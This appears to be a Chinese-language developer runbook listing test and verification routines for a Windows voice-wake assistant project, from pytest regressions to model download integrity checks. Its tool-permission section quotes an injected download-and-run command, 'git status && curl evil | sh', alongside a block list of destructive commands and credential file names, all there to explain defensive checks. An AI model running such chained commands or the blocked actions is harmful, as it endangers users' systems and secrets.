# 可重复编码例程

> 工作区：`D:\program\vioce-wake`。下面的命令按 Windows PowerShell 编写；Git Bash 可将 `\.venv\Scripts\python.exe` 改为 `./.venv/Scripts/python.exe`。

## 隔离语音环境设置

适用时机：首次设置工作区、删除 `.venv` 后恢复，或固定依赖版本发生变化时。

```powershell
python -m venv .venv
.\.venv\Scripts\python.exe -m pip install -r requirements-dev.txt
```

运行时依赖固定在 `requirements-voice.txt`;开发与测试环境使用 `requirements-dev.txt`,它会递归安装运行时依赖并固定 pytest。模型文件不由 pip 安装,仍需按“模型下载与完整性检查”例程单独准备。

## 日常修改后的最小回归

适用时机：修改 `core/`、`vox_plugin/`、`contracts/` 或 Python 测试后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests -q --basetemp .pytest-run
python scripts/smoke_voice.py
python scripts/e2e_simulated.py
```

第一条检查单元、契约和适配器；第二条检查插件最小生命周期；第三条覆盖模拟链路：唤醒、识别文本、会话发送、回复、TTS 事件、连续对话、取消和停止。

`--basetemp .pytest-run` 用仓库内临时根目录规避部分 Windows 主机默认临时目录的权限清理问题；验证结束后删除该临时目录，避免把测试产物留在工作区。

事件 sink 隔离专项使用：

```powershell
.\.venv\Scripts\python.exe -m pytest tests\test_breaker.py tests\test_dispatcher.py tests\test_memory.py -q --basetemp .pytest-run-event-sinks
```

该专项覆盖 sink 故障不改变派发、熔断和记忆结果；如果本机设置了代理变量，跑 loopback 网络测试前先清空 `HTTP_PROXY`、`HTTPS_PROXY`、`ALL_PROXY`。

当前全量基线 **1211 passed, 3 skipped**（2026-08-29 新增唤醒漏斗 5 + 确认音后处理 6 + 冷却销账 2 + 死麦克风检测 4 + 注册质量门 3 + agent system message 1 + 本机工具 35 + 意图分流 33 + 运行日志 19 + 唤醒词表 20 + 唤醒确认音 17 + `.env` 读写 13 + 控制台唤醒词 API 6 + 出站 User-Agent 2 + 中文语速 1 + 唤醒包装层 4 + agent 工作目录 3 + CLI prompt 走 stdin 6 + 出厂 agents.toml 可加载 1 + 模型列表拉取 19；2026-08-28 新增控制台 103 / 模型方案 60 / MCP 51 / 搜索后端 35 / 配置编辑 33 / 语音配置 20 / 语音装配 16 / 声纹身份 15 / 记忆并发 7）。3 个 skip：2 个可选 VoxCord 适配器（**目录在本机但依赖未装，见 `docs/backlog.md` B1**），1 个符号链接越界用例（本账户无权创建符号链接）。

**断言出厂配置内容的测试改成了对本机改动宽容**：`config/models.toml` 那条改成「出厂那两套在」而不是「只有这两套」（控制台上新建方案是正常动作），搜索后端那条改成读 `_DEFAULTS` 而不是读本机 `config/tools.toml`（`allow_internet = true` 是一个正常的本机决定）。要守的是「出厂默认不配后端」，那由 `core/tools/policy.py` 的 `_DEFAULTS` 决定。

DesktopBridge 专项 **33 passed**；采集专项 **36 passed**。声纹模型已就位，所以 `tests/integration/test_speaker_model.py` 的 5 个用例现在会真跑；模型缺失的机器上它们 skip —— skip 数会随环境变化，**passed 数下降才是回归**。

## 控制台回归（含渲染取证）

适用时机：修改 `core/console/`（含 `static/index.html`）、`core/config_edit.py`、
`core/models_config.py` 或任何控制台可编辑的配置白名单之后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests\test_console.py tests\test_config_edit.py tests\test_models_config.py -q --basetemp .pytest-run-console
```

期望 **103 + 33 + 60 passed**。它覆盖：回环校验（`0.0.0.0` 拒绝构造）、token（无 token 401
含页面本身、Bearer 与 `?t=` 都认、`describe()` 不含 token）、WAV 解析的四条拒绝路径、
安全边界不可编辑（`shell.enabled` / `fs.roots` / `speaker.require_verification` /
`agents[N].command` / `mcp.require_confirmation` / `servers[N].auto_allow`）、档案路径
穿越与凭据形状拒绝、配置编辑保留注释与**行尾**且校验失败不落盘、模型方案的密钥形状拒绝、
预设值不落盘、探测端点不带凭据且不跟随重定向。

**只跑测试不算验证。** 前端是一个单文件 HTML，测试碰不到它，所以还要一次渲染取证：

```powershell
# 起服务（.claude/launch.json 里的 console 配置，autoPort，不占唤醒球的 5173）
#   preview_start console
# 然后：
#   preview_snapshot        读结构，确认侧栏九个视图都在
#   preview_console_logs    必须为空 —— 一条 JS 错误就意味着某个面板根本没渲染
#   preview_eval            逐个视图读它的宿主节点，确认吃到的是真实读数而不是占位态
#   preview_screenshot      留一张视觉证据
```

判据：`preview_console_logs` 无输出；`#models-degraded` 是 hidden 的（可见就说明
`/api/models` 没通，页面退到了出厂后备表）；`/api/state` 的 JSON 里搜不到 `token`、
`voiceprint`、`embedding`、`vector`；就绪板的格数等于 `readiness()` 的行数
（第二版**不再**额外加麦克风那一行）；侧栏底部读「已连接」。

**宽版布局要另外量一次。** 预览面板通常只有 ~835px，那是响应式的那一支（≤1080px 时侧栏
横排）。设计的主布局是 236px 侧栏 + 正文，得用 Edge headless 才看得到：

```bash
"/c/Program Files (x86)/Microsoft/Edge/Application/msedge.exe" --headless=new \
  --hide-scrollbars --window-size=1440,1600 --virtual-time-budget=9000 \
  --screenshot=out.png "http://127.0.0.1:8899/#models"
```

同时量一次横向溢出，两个宽度都要：

```javascript
// preview_eval
const d = document.documentElement;
JSON.stringify({ overflowX: d.scrollWidth > d.clientWidth, doc: d.scrollWidth, client: d.clientWidth })
```

`overflowX` 必须是 `false`。**这条判据是一个真实缺陷换来的**：`.shell` 的
`align-items:flex-start` 在竖排布局下让侧栏缩到内容宽（九个 nowrap 链接 = 1026px），
把整页撑宽 223px，而 `nav` 的 `overflow-x:auto` 因为拿不到确定宽度永远不生效。

**Browser 面板没显示时截图会超时**（页面不合成帧），那不是缺陷；此时 snapshot 与 eval
仍然可用，视觉证据走上面那条 Edge headless。

### 模型配置的写入取证

配置写入的正确性不在截图里，在字节里。一次「什么都没改就保存」必须是**零字节差异**：

```powershell
# 保存前
.\.venv\Scripts\python.exe -c "import hashlib,pathlib; print(hashlib.sha256(pathlib.Path('config/models.toml').read_bytes()).hexdigest()[:16])"
# 在页面上点「保存方案」，然后再算一次 —— 两个哈希必须相同
```

不同就是回归，而且回归有两种已经发生过的形态：①预设的 `base`/`proto`/`key_env` 被写进
文件（多出四行 `providers.py` 里已有的值）；②整个文件的行尾被重写（`write_text` 在
Windows 上把 LF 翻成 CRLF）。第二种在 `git diff` 里**看不见** —— 本仓库
`core.autocrlf=true` 会归一化掉它，所以哈希是唯一能抓到它的判据，这也是这条取证存在的理由。

## 模型测试（拿真实模型跑一次）

控制台的「模型测试」区就是这条例程的界面版，命令行等价物：

```powershell
# TTS：真实模型合成，不需要输出设备
.\.venv\Scripts\python.exe -c "from vox_plugin.voice_stack import open_voice_stack; s=open_voice_stack(); p=s.tts; print(p.load()); a=p.synthesize('控制台测试完成'); print(a.sample_rate, a.samples.size, a.elapsed_ms)"

# 就绪清单
.\.venv\Scripts\python.exe scripts/run_voice.py --check
```

本机实测（2026-08-28）：MeloTTS 合成「控制台测试完成」→ 44100 Hz / 6041 采样点 /
243 ms。等级 AUTO+真实模型；**听见声音**才是 REAL。

## 云端识别验收（ADR 009）

**先跑不打网络的那一档**，它覆盖请求形状、隐私（不落盘）、端点判定、续说拼接：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_asr_cloud.py -q   # 42 passed，一次网络都不打
```

真机（会真的发音频出网、会计费）两个探针，都在 `.vox-ref/`（不在版本库，换机器按下面重建）：

```powershell
# 1. 形状探针：同一段音频用五种请求形状各发一次，看哪种回 200
$env:PYTHONUTF8=1; .\.venv\Scripts\python.exe .vox-ref\asr_cloud_probe.py

# 2. 契约探针：按 100 ms 真实节奏喂进 provider，走 create_stream/feed/finalize
$env:PYTHONUTF8=1; .\.venv\Scripts\python.exe .vox-ref\asr_cloud_stream_probe.py
```

期望（2026-09-03 本机实测，样本是 `.vox-ref/rec/` 里的真录音）：

| 探针 | 期望 |
|---|---|
| 形状 | **只有**「原生端点 + `data:audio/wav;base64,…` + `parameters.format`」回 200。裸 base64 回 500（服务端拿 wget 去下载），缺 `parameters` 与 `compatible-mode/v1` 都回 400 `format is empty` |
| 契约 | 「你好小沃」→ `你好，小沃。`；带 1.9 s 停顿的长句被切成两段又拼回来（`continuations = 1`），文本完整 |
| 延迟 | 端点判出 ≈ 说完 + 0.8 s，往返 3–5 s ⇒ **说完之后 4–5 秒拿到文本** |

**重建这两个探针**：形状探针就是把同一段 wav 按上表五种形状各 POST 一次并打印状态码；
契约探针是 `DashScopeAsrProvider().create_stream()` + 每 100 ms `feed()` 一块（真实音频喂完
接一段静音），直到 `is_endpoint` 为真再 `finalize()`。**必须按真实节奏 sleep** —— 一口气灌完
只能证明请求发出去了，证明不了延迟（HTTP 在工作线程上，`_poll` 只在下一次 `feed` 里被看一眼）。

「探一下能不能连」那颗按钮**对这条路没有意义**：百炼原生接口没有 `GET {base}/models`，
探它必然 404 而页面把 404 解释成「路径拼错了」。所以它现在直接拒绝并指向上面两个探针。

## MCP 回归

适用时机：修改 `core/tools/mcp.py`、`config/mcp.toml`、`contracts/mcp.schema.json`
或 `policy.py` 的 `mcp.` 分支之后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests\test_mcp.py -q --basetemp .pytest-run-mcp
```

期望 **51 passed**。等级 **SIM** —— 测试驱动的是一个进程内假 server（讲 `initialize` /
`notifications/initialized` / `tools/list` / `tools/call` 四种形状）。**没有第三方 MCP
server 通过这个客户端完成过调用**，那是一条新的 REAL 级验收项。

其中最该看的四条：出厂配置不启用任何 server、一个 `fs.read` 之类的 server 名会被拒
（否则能伪造内置工具段名）、`"confirmed": "no"` 不算确认、`allow` 名单在运行时复检。


## 契约或事件字段变更

适用时机：修改 `contracts/voice-events.schema.json`、事件类型、状态机或插件事件 payload 后。

```powershell
python -m pytest tests/test_event_schema.py tests/test_events.py tests/test_voice_contract.py tests/test_plugin_tools.py -q
```

同时检查 `contracts/voice-events.schema.json` 的枚举是否覆盖新增事件。**信封的唯一构造点是 `core/events.py`** —— 新事件类型只需加进契约文件，`allowed_types()` 在运行时读取，Python 侧不需要同步改动；`tests/test_events.py` 会在两者漂移时失败。事件版本变更时，更新协议文档和兼容性测试，不要只改生产代码。

平台事件走 `contracts/agent-events.schema.json`（P2 新增），另跑一组：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_agent_event_schema.py -q
```

预期 **34 passed**。这一组还守着三件与语音契约有关的事：

- `voice-events.schema.json` **字节不变**（SHA-256 摘要钉死，575 字节 `4f60…5de5`）。这条测试变红意味着有人在原地改语音契约 —— 平台事件属于另一个文件，语音事件真要变则是**信封版本递增**，不是原地编辑。
- 两个契约的信封**逐字段同形**、两个 `type` 枚举**互斥**。同形是合流的前提，互斥是 `contract_for()` 不歧义的前提；任一变红，`validate_any_event()` 就不再可信。
- `contracts/agents.schema.json` **不许长出校验器没实现的关键字**。声明了却不生效的约束比不声明更糟，反向断言把这条钉住；`kind` 枚举与 `AGENT_KINDS` 必须相等，否则配置校验通过后会在构造适配器时才炸。

新增平台事件类型时只改契约文件，但记得同步 `test_platform_contract_declares_the_expected_surface` 里的分组断言 —— 它逐组断言而不是只断言总数，这是有意的。

## Provider 适配器变更

适用时机：修改 `core/audio/`（`base` / `kws` / `vad` / `capture` / `voxcord`）、`core/providers.py` 重导出薄壳、VoxCord 动态导入、Sherpa 模型加载或设备发现后。

```powershell
python -m pytest tests/test_provider_adapter.py tests/test_sherpa_provider.py -q
python -c "from core.providers import VoxCordAdapter; print(VoxCordAdapter().load())"
```

没有 VoxCord、Sherpa 或音频驱动时，导入仍应成功；不可用状态应返回原因，而不是在模块导入阶段崩溃。第二条命令走的是 `core/providers.py` 的重导出路径，它同时验证拆包后旧导入路径没有断。

## Sherpa 中文 KWS 验证

适用时机：更换 Sherpa 版本、ONNX 模型、关键词文件、阈值、线程数或音频分块大小后。该例程不打开麦克风，只使用随模型附带的 wav。

```powershell
.\.venv\Scripts\python.exe tmp_proto/test_kws.py `
  models/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/test_wavs/3.wav
```

预期输出包含 `audio`、`RTF`、`hits`、`silence control` 和 `resource release OK`。`RTF < 1` 才表示实时性达标；静音应为 `clean (no false trigger)`。测试音频使用模型自带的 `test_keywords.txt` 时，需要把脚本中的 `keywords_file` 切换到该文件；它不是“你好问问”的真实录音。

模型已下载时，也可以运行隔离 provider 测试：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_sherpa_provider.py -q
```

## TTS→VAD→KWS 闭环验证

适用时机：更换 TTS/KWS/VAD 模型、音频重采样逻辑、关键词文件或 Sherpa 版本后。该例程不打开麦克风，用 TTS 合成的“你好问问”回灌唤醒模型。

```powershell
.\.venv\Scripts\python.exe tmp_proto/tts_kws_vad.py
```

预期 JSON 输出中 `hit: true`、`kws_hits` 包含 `你好问问`、`vad_segments` 非空，并写出 `tmp_proto/tts_nihao.wav`。注意使用隔离 `.venv` 的 Python，因为它安装了 sherpa-onnx 和 soundfile；系统 Python 没有这些依赖。

## 本地麦克风与 VAD 冒烟

适用时机：更换电脑、音频驱动、输入设备、`sounddevice` 版本或 Silero 模型后。音频只保存在内存中，不保存、不上传。

先列出设备：

```powershell
.\.venv\Scripts\python.exe -c "import sounddevice as sd; print(sd.query_devices())"
```

再用输入设备编号运行短采集：

```powershell
.\.venv\Scripts\python.exe scripts/acceptance/smoke_microphone.py --device 1 --duration 3
```

预期结果包含 `REAL_MICROPHONE_LOCAL`、非负 RMS/peak、`audio_saved: false` 和 `resources_released: true`。安静环境中 `vad_segments` 为空是正常结果；该命令只证明设备、采集和 VAD 管线可用，不证明真实唤醒质量。

## 真实麦克风唤醒验收

适用时机：更换麦克风、唤醒词、关键词阈值或 Sherpa 版本后。用隔离 `.venv` 的 Python 运行（系统 Python 没装 sherpa-onnx / soundfile）：

```powershell
.\.venv\Scripts\python.exe scripts/acceptance/live_wake.py --duration 45 --device 1
```

运行后对着麦克风说「你好问问」。预期立即打印 `WAKE HIT: '你好问问'`，结束 JSON 中 `hit: true`、`audio_saved: false`、`resources_released: true`。可用 `--threshold` 覆盖 `config/voice.toml` 的阈值（默认 0.25），`--device` 从设备列表中选择，`--all-hits` 跑满整个时长统计多次命中。

**门默认是开的**，因为那是出厂配置。`--no-gate` 只测 KWS 模型本身；输出 JSON 里的
`gate` 字段记录跑的是哪一种，**这样命中率永远不会被引用到错的配置上**。带门跑时被拒绝
的唤醒会打印 `WAKE REJECTED` 并进 `rejections` 数组 —— 那也是数据。

> 这个脚本在 2026-08-28 之前**跑不起来**：它建 capture 时既没传 verifier 也没传
> `require_verification=False`，而默认是 `True`，所以 `capture.start()` 在 fail-closed
> 门上直接抛。现在它复用 `open_voice_stack`，模型路径也不再硬编码。

## 全链路语音（唤醒 → 识别 → 派发 → 出声 → 打断）

```powershell
.\.venv\Scripts\python.exe scripts/run_voice.py --check      # 先看还缺什么
.\.venv\Scripts\python.exe scripts/run_voice.py              # 生产入口
.\.venv\Scripts\python.exe scripts/acceptance/live_conversation.py   # 验收版，打印 verified_by
```

`run_voice.py` 是**生产入口**，`live_conversation.py` 是验收脚本（多打印一个
`verified_by=` —— 声纹门验出来的那个名字，好让报告能写清这一轮是以授权说话人身份跑的
还是以「没有人」跑的）。两者共用 `open_voice_stack`。

必需项（唤醒模型、声纹注册）没就绪时 `run_voice.py` **拒绝启动**并逐项打印怎么补，
不是启动后再失败。

## REAL-AGENT 探测

适用时机：任一 agent 后端完成登录、装好、或网络恢复之后。

```powershell
.\.venv\Scripts\python.exe scripts/acceptance/probe_agents.py
.\.venv\Scripts\python.exe scripts/acceptance/probe_agents.py --all --json
```

它报三个互不混淆的等级：`configured`（配置里有）→ `available`（`check()` 找到了命令
与传输）→ `REAL-AGENT`（**真的答了带文字的一轮**）。一条干净但没有文字的流不算答上 ——
否则会用一个空回复关掉一个发布阻塞项。

2026-08-24 三个后端全部「试过被挡」：`claude` Not logged in、`codex exec` 90s 无输出、
`opencode` 连不上云端点。把每个 error 原样记进 `prototype-results.md`，恢复后重跑这条
命令即是重试。

## 30 分钟资源画像

```powershell
.\.venv\Scripts\python.exe scripts/acceptance/resource_profile.py --minutes 30
.\.venv\Scripts\python.exe scripts/acceptance/resource_profile.py --minutes 1 --voice   # 冒烟
```

零新依赖：Windows 上走 `ctypes` 调 `GetProcessMemoryInfo` / `GetProcessTimes`。采不到
时记 `not collected` 而不是 0（0 会读作一次测量）。输出 CSV + 摘要，其中
**`rss_mb_growth` 是 30 分钟里最该看的一个数** —— 稳定 180 MB 没问题，180 爬到 900 是漏。

脚本**只报数字，不给结论**：「180 MB 可不可以接受」取决于这台机器和同时在跑的东西，
那一句要人写进 `prototype-results.md`。等级 REAL-WIN。

> 注意：`ctypes` 的 `restype`/`argtypes` 必须声明。不声明的话 `GetCurrentProcess` 的
> 伪句柄 `(HANDLE)-1` 会被截断成 32 位，之后每次调用都失败，症状是一整张 `n/a` 的画像
> 看起来像「这个平台不支持」。

## 声纹回归

适用时机：修改 `core/audio/speaker.py`、`core/audio/capture.py` 的环形缓冲或声纹门、`config/speaker.toml`、注册脚本，或调整阈值后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_speaker.py tests/test_speaker_privacy.py -q
```

预期 **30 passed**；声纹加固另跑 `tests/test_speaker_hardening.py`（14 例，同样免模型）。这组测试**故意不依赖 37.8 MB 声纹模型**：要守的性质恰恰是模型缺失时必须成立的那些。逐条必须成立的是 fail-closed（失败即关闭）四条路径 —— 模型缺失、无人注册、embedding 抛异常、分数低于阈值 —— 全部落在拒绝一侧，`verify()` 对普通拒绝从不抛异常而是返回 `accepted=False`。另外两条是隐私断言：`describe()` 不含任何向量值，音频不落盘。

**任何一条 fail-closed 断言变红都不许绕过。** 一个模型缺失就静默放行的声纹门，比没有门更糟 —— 它给了一种不存在的安全感。

判别力与阈值另跑需要模型的那一组（预期 **5 passed**，模型缺失时 5 skipped）：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/integration/test_speaker_model.py -q
```

它在模型自带的 7 段真实人声上断言簇内最低相似度高于簇间最高（实测 0.736 vs 0.370），默认阈值 0.5 落在这个间隙里。**这是 AUTO 不是 REAL-MIC** —— 既有录音不等于本机麦克风，本人通过率与他人拒绝率仍待 P10。其中一条是反向断言：合成音调**必须**继续互相通过，一旦它变红说明合成音频开始能测判别力了，改文档再依赖它。

改完阈值后同时看诊断：

```powershell
.\.venv\Scripts\python.exe -c "from vox_plugin import VoicePlugin; import json; print(json.dumps(VoicePlugin().diagnose()['speaker'], ensure_ascii=False, indent=2))"
```

预期只有名字与样本数，**绝不含向量**。若 `require_verification` 为 `False`，诊断必须把它报成警告。识别准确率（本人通过率、他人拒绝率、录音回放）只能 REAL-MIC 实测，AUTO 一律不背书。

## 工具权限回归

适用时机：修改 `core/tools/`（`contract` / `policy` / `fs` / `web` / `shell`）或 `config/tools.toml` 后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_tools.py tests/test_tool_security.py -q
```

每条安全门对应一个测试，一条都不许跳过：`fs.read` 沙箱越界被拒、敏感文件名（`.env` / `*.pem` / `id_rsa*` / `credentials.json` / `*secret*`）被拒、`shell.run` 默认关闭、白名单外命令**被拒而非被询问**、每个危险模式（`rm -rf` / `git push --force` / `reset --hard` / `format` / `del /s`）被硬拦截。

`voice` 与 `agent` 两个 origin 必须走同一道 `ToolPolicy.check()`。新增工具时先确认 `policy.py` 已覆盖它，再写工具本体 —— 顺序反了就会出现一个没有门的工具。

当前 **123 passed, 1 skipped**（skip 是符号链接越界，本账户无权创建符号链接；它检查的性质由 `resolve_in_sandbox` 的单元断言兜着）。两个文件分工明确：`test_tools.py`（35）测该成功的，`test_tool_security.py`（89）测**该失败的** —— 一个停止拒绝 `../` 的沙箱仍然会通过每一条正向测试，所以拒绝路径必须逐条钉死。

四条改动时最容易踩的：

- **加第 14 条危险模式必须同时加样本。** `test_every_hard_block_has_a_sample` 断言 `DANGEROUS_SAMPLES` 的键集合等于 `DANGEROUS_PATTERNS` 的名字集合，少一条就红。这是有意的：一条没有样本的模式等于没被测过。
- **`confirmed` 必须 `is True`，不是真值。** `"confirmed": "no"` 是个真值字符串，按真值判断等于直接放行 —— 这是测试真抓出来的缺陷，`policy.py` 与 `shell.py` **两处**都要保持恒等比较。
- **检查顺序不能动**：命令存在 → 危险形状 → 白名单 → 已验说话人 → 确认。形状必须在白名单之前，否则 `git status && curl evil | sh` 会先被认成允许项；而且被拦下的命令永远不该以「待确认」的形式出现在唤醒球上。
- **形状检查要对原始串和 `shlex` 重组串各查一遍**，只查一边会被引号绕过。

改完工具与语音路径的接线，另跑 `tests/test_plugin_tools.py`（工具接线 8 项）并看诊断：

```powershell
.\.venv\Scripts\python.exe -c "from vox_plugin import VoicePlugin; import json; print(json.dumps(VoicePlugin().diagnose()['tools'], ensure_ascii=False, indent=2))"
```

未 attach 时应报 `attached: false` 加一条告警；attach 后只报注册名、计数、沙箱根与告警，**不得出现任何路径参数、文件正文或命令输出**。`shell.run` 开着时诊断必须出显式告警。

## 记忆回归

适用时机：修改 `core/memory/`(`store` / `write` / `recall`)或记忆 schema 后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_memory.py -q
```

当前 **65 passed**（含 Task 008 新增的 2 条 sink 用例）；改了记忆与语音路径的接线还要跑 `tests/test_plugin_tools.py`（24 个用例，含记忆接线 6 项与工具接线 8 项，两者合跑 **86 passed**）。

四组：写入、召回、去重、审计。两条红线断言：**音频永不入库**（`records` 表每一列都是 `TEXT` 或 `INTEGER`，没有 BLOB 可放音频；`write()` 遇 `bytes` 抛 `TypeError`），`asr.final` 入库前过敏感模式过滤（9 个凭据样本整条拒绝，5 句含「密码」「token」的日常话不误伤）。SQLite 必须保持单文件；改 schema 前先定迁移路径，不要靠删库重建。

中期事实同时落 `memory/facts/*.md`，人类可读层是事实来源、SQLite 是索引。手改 Markdown 后应能在下一次召回中体现 —— AUTO 已覆盖同进程内的往返（`sync_facts()` 折回索引），跨进程持久性另见下方验收例程。

`sync_facts(prune=True)` 才会因为文件消失而删索引，默认 `prune=False`：一次误删目录不该清空记忆。

## 记忆跨进程持久性验收

适用时机：修改 `core/memory/` 的存储、镜像或折回逻辑后；以及发布前确认「记忆跨会话持久性」阻塞项的自动化部分仍成立。

```powershell
$tmp = Join-Path $env:TEMP ("vox-mem-persist-" + [guid]::NewGuid().ToString("N"))
.\.venv\Scripts\python.exe scripts/acceptance/verify_memory_persistence.py --workdir $tmp
Remove-Item -Recurse -Force $tmp
```

预期最后一行 JSON `all_pass: true`：进程 A 写入的事实在新进程 B 中可召回；脚本模拟手改 Markdown 后，`sync_facts()` 折回且下一次召回只见新文案、旧文案不再命中。等价集成用例 `tests/integration/test_memory_cross_process.py` 会随全量一起跑。证据等级 AUTO_MULTI_PROCESS —— 真机应用重启的人工确认仍属 REAL（P10），不因本例程视为关闭。

改中文分词（`index_tokens` / `query_tokens`）必须同时跑 `test_index_and_query_tokenizers_agree_on_chinese` 与 `test_recall_is_precise_enough_to_return_nothing` —— 索引侧与查询侧的分词一旦不一致，召回会静默变空或静默变宽，两个方向都不会报错。原因见 ADR 004 的 2026-08-02 修正：FTS5 默认分词器搜不到中文，索引的是派生 token 列而不是原文。

## agent 适配器回归

适用时机：修改 `core/agents/`(`contract` / `cli` / `evox` / `acp` / `http` / `openclaw`)或 `config/agents.toml` 后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_agent_contract.py tests/test_agent_cli.py tests/test_agent_evox.py -q
```

预期 **59 passed**（`contract` 14 + `cli` 28 + `evox` 17）。

`test_agent_contract.py` 是红线 2 在 agent 层的落点，它**解析注解**而不是读源码文本：`AgentDescriptor` / `Task` / `AgentChunk` 的每个字段递归走到叶子类型，只许 `str` / `int` / `float` / `bool` / `frozenset` / `tuple` / `Mapping` / `None`。递归是必须的 —— 只看最外层容器会让 `frozenset[SomeSdkClient]` 通过，所以有一条反向断言专门证明这个走法真的能拦下伪 SDK 类型。`Any` 只允许出现在 `AgentChunk.arguments`（工具调用的参数，形状由工具定义、由 `core/tools/policy.py` 校验），多一处就红。契约模块的 import 也被钉住：只许 `__future__` / `dataclasses` / `typing`，这条断言走 AST 而不是子串搜索，因为模块自己的 docstring 里就写着 `subprocess` 这个词。

四条改 `cli.py` 时最容易踩的：

- **失败必须是 chunk 不是异常。** 命令不存在、非零退出、超时、取消，四条路径都以带 `error` 的终结 `done` chunk 到达。派发器要能 race 两个 agent 而不用给每个包 `try`，一个坏 agent 不许把整个回合带走。
- **恰好一个 `done`。** JSONL 流里 agent 自己报的 `done` 被折进终结 chunk 而不是直接 yield —— 「每条流恰好一个 `done`」是派发器判断回合结束的依据。
- **放弃流必须杀掉进程。** `race` 模式（P6）会中途丢弃输家，生成器的 `finally` 负责收尸；漏了它，一次输掉的竞速就留下一个野进程。
- **Windows 批处理 shim 走字符串命令行而不是 argv 列表。** npm 把 `claude` 装成 `claude.cmd`，CreateProcess 用 `cmd.exe /c` 跑它；Python 按 C 运行时规则引用参数，不按 cmd.exe 规则，所以带 `"` 或 `%` 的参数**拒绝而不是转义**（BatBadBut）。一个只对两个解析器之一有效的转义比直接说不更糟。

**mock 子进程只算 SIM。** 真实 CLI 端到端跑通一轮才是 REAL-AGENT，两者不得互相冒充。`evox.py` 包装后的行为必须与包装前的 `LocalEvoXTransport` 路径一致，`core/session_bridge.py` 的五道安全校验不得随之降级 —— `evox.py` 是**包装**不是移植，这正是包装的理由。

`evox` 适配器**不流式，也不可能流式**：桥接是一次阻塞 POST 返回完整回复，没有增量端点可读。所以首字延迟等于整轮延迟，这是端点的属性不是这里偷的懒。改动时不要给它加一个「看起来增量」的外壳 —— 那会让路由的延迟数字变成虚构。

## 派发回归

适用时机：修改 `core/dispatch/`(`dispatcher` / `router` / `aggregator` / `intent` / `breaker`)后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_router.py tests/test_dispatcher.py tests/test_aggregator.py tests/test_intent.py tests/test_breaker.py -q
```

期望 **159 passed**（router 30 + dispatcher 37 + aggregator 20 + intent 54 + breaker 18）。覆盖五维打分（能力/成本/延迟/成功率/负载）、熔断器开合、`single` / `race` / `fanout` 三模式、规则意图分类。双 fake agent 必须产出行为一致的回合 —— 这是红线 2 在派发层的落点。

**语音路径默认必须是 `single` 或 `race`。** 若默认变成 `fanout`，首字延迟会退化为最慢 agent 的延迟；这不是性能退步而是体感破坏，改动前先看 ADR 005。

改这一层时四条不许松的属性：

- **合并后的流恰好一个 `done`。** 派发器只凭它判断回合结束：多一个会提前结束回合，少一个会挂住。`fanout` 因此折叠每个 agent 的 `done`，而不是转发。
- **`race` 的获胜者在首个 chunk 时决定，不是完成时。** 按完成判定会让空流赢——它最先完成。带 `error` 的终结 chunk 也算「说话了」：静默切给输家会把合并流变成隐式重试，而派发器会把失败的一轮记成成功。
- **动词后面必须有边界（`intent.py` 的 `_VERB_SEP`）。** 只锚在开头不够：「运行时报错了怎么办」以「运行」开头，会把「时报错了怎么办」当命令跑。改意图规则先跑 `tests/test_intent.py` 的**反向半区**，那 14 条才是这个文件的安全属性。
- **派发器永不自动确认。** `needs_confirmation` 原样带出，绝不带 `confirmed=True` 重试。一个会自己点确认的派发器让 P4 的四层全部失效。

`task.progress` 的 payload 里是 `agents`（复数）不是 `agent`：`AgentChunk` 没有来源字段，合并后的 chunk 无法归属，报一个猜的名字比不报更糟。想报「谁答的」得先给 chunk 加来源。

## 模型下载与完整性检查

适用时机：首次设置、清理缓存后恢复、或模型文件不完整时。必须使用固定版本 URL，并在解压前确认归档完整。

```powershell
$env:HTTP_PROXY = "http://127.0.0.1:12334"
$env:HTTPS_PROXY = "http://127.0.0.1:12334"
$env:ALL_PROXY = "http://127.0.0.1:12334"

curl.exe -C - -L -o models/tts.tar.bz2 `
  https://github.com/k2-fsa/sherpa-onnx/releases/download/tts-models/vits-melo-tts-zh_en.tar.bz2
7z t models/tts.tar.bz2
7z x models/tts.tar.bz2 -omodels
```

若代理没有监听，先检查：

```powershell
Test-NetConnection 127.0.0.1 -Port 12334
```

`file ends unexpectedly` 或 `7z t` 失败表示下载不完整，不能解压或把它当成模型使用。恢复前保留部分文件，使用 `curl -C -`；如果服务器不接受续传，删除该文件后重新下载。

声纹模型是单个 `.onnx`，不需要解压（约 27 MB）：

```powershell
curl.exe -C - -L -o models/3dspeaker_speech_campplus_sv_zh-cn_16k-common.onnx https://github.com/k2-fsa/sherpa-onnx/releases/download/speaker-recongition-models/3dspeaker_speech_campplus_sv_zh-cn_16k-common.onnx
```

release tag 里 `recongition` 的拼写是**官方笔误**，照抄即可，改成正确拼写会 404。下载后用 provider 自检而不是只看文件大小（不传路径就是默认模型，也就是上面这个）：

```powershell
.\.venv\Scripts\python.exe -c "from core.audio import SpeakerVerificationProvider; print(SpeakerVerificationProvider().load())"
```

预期 `available: True` 且 `dim` 为正整数。文件截断时 `load()` 会返回不可用及原因，**不会抛异常** —— 所以必须看返回值，不能靠「没报错」判定成功。

本机实测值,用于比对完整性：

| 模型 | 字节 | SHA-256 | dim |
|---|---:|---|---:|
| CAM++（2026-08-29 起默认） | 28,281,138 | `f682b514c05d947ee3fa91cd6ec6c5c7543479a128373fa29b1faedccd21fd11` | 192 |
| ERes2Net（已取代） | 39,593,761 | `1a331345f04805badbb495c775a6ddffcdd1a732567d5ec8b3d5749e3c7a5e4b` | 512 |

**换型会让既有注册全部作废**（512 维向量对 192 维模型没有意义）。作废的档案由 `_restore()` 记进 `stale_profiles`、`describe()` 报出来 —— 必须重新注册，而不是以为「文件丢了」。

```powershell
(Get-FileHash models/3dspeaker_speech_campplus_sv_zh-cn_16k-common.onnx -Algorithm SHA256).Hash
```

流式 ASR 模型（**2026-08-29 换成 `multi-zh-hans-2023-12-12`**，约 310 MB 归档）：

